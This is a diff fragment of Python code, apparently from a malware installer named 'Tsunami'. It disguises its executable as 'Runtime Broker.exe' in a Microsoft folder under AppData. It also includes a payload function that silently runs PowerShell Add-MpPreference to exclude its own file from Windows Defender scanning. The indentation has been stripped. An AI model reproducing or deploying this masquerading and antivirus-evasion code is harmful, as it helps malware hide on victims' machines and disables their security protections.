@@ -1,0 +1,55 @@
+ROAMING_APPDATA_PATH = os.getenv("APPDATA")
+
+LOCAL_APPDATA_PATH = os.getenv("LOCALAPPDATA")
+
+TSUNAMI_INSTALLER_NAME = "Runtime Broker"
+
+TSUNAMI_INSTALLER_FOLDER = rf"{ROAMING_APPDATA_PATH}\Microsoft\Windows\Applications"
+
+TSUNAMI_INSTALLER_PATH = rf"{TSUNAMI_INSTALLER_FOLDER}\Runtime Broker.exe"
+
+##### Utils #####
+
+def output(text: str) -> None:
+
+if DEBUG_MODE:
+
+print(text)
+
+def is_admin() -> bool:
+
+try:
+
+return ctypes.windll.shell32.IsUserAnAdmin()
+
+except:
+
+return False
+
+##### Tsunami Payload #####
+
+def add_windows_defender_exception(filepath: str) -> None:
+
+try:
+
+subprocess.run(
+
+["powershell.exe", f"Add-MpPreference -ExclusionPath '{filepath}'"],
+
+shell = True,
+
+creationflags = subprocess.CREATE_NO_WINDOW,
+
+stdout = subprocess.PIPE,
+
+stderr = subprocess.PIPE,
+
+stdin = subprocess.PIPE
+
+)
+
+output(f"Added a new file to the Windows Defender exception")
+
+except Exception as e:
+
+output(f"[-] Failed to add Windows Defender exception: {e}")
